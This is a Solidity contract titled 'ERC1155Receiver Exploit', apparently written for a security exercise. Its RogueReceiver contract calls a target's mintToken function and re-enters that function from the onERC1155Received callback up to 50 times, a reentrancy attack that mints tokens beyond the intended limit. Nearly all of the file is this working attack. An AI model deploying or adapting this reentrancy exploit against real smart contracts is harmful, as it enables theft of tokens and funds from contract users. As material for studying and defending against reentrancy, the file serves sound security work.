// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../../lib/openzeppelin-contracts/contracts/token/ERC1155/IERC1155Receiver.sol";
import "../../lib/openzeppelin-contracts/contracts/token/ERC1155/IERC1155.sol";
import "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

/**
 * @title ERC1155Receiver Exploit
 * @author Mahendran Anbarasan
 * @notice This contract exploits the _mint function in ERC1155.
 */
interface IDoubleSpender {
    function mintToken() external payable;
}

contract RogueReceiver is IERC1155Receiver {
    IDoubleSpender spender;
    IERC20 token;
    uint256 public constant DECIMALS_PER_TOKEN = 1e18;
    uint256 counter;

    function hack(address _spender, address _token) public {
        if (address(spender) == address(0x0)) {
            spender = IDoubleSpender(_spender);
            token = IERC20(_token);
        }
        spender.mintToken();
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        returns (bytes4)
    {
        if (counter < 50) {
            counter++;
            spender.mintToken();
        }

        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4) {}

    function supportsInterface(bytes4 interfaceId) external view returns (bool) {}
}
